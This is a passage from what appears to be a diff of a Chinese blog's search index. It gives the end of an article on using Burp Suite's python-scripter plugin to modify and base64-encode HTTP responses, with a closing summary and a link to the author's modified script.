+  除了对请求处理之外，我们也可以对响应做处理，而且操作结果会直接在当前页面里显现出来，不会像请求一样需要在日志里查看其修改结果，可以很好的解决响应内容加密的问题。还拿上面的请求为例，其响应内容是未加密的，这里给它做一次加密，简单的对相应内容做一次替换：
+  
+  使用base64进行加密
+  
+  最终的结果如下
+  
+总结  使用python-scripter可以灵活的写出适用于不同场景下的插件，同时可以将其保存为模板，方便之后遇到相似情况下的使用。本次虽然遇到的加密算法比较简单，但是以python执行jS的便捷，相信再复杂些的算法也能很快的实现。
+  本文中修改过后的pyscripterer已上传至github: https://github.com/No4l/python-scripter/blob/main/pyscripterer.py
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>BurpSuite</tag>
       </tags>
   </entry>
 </search>
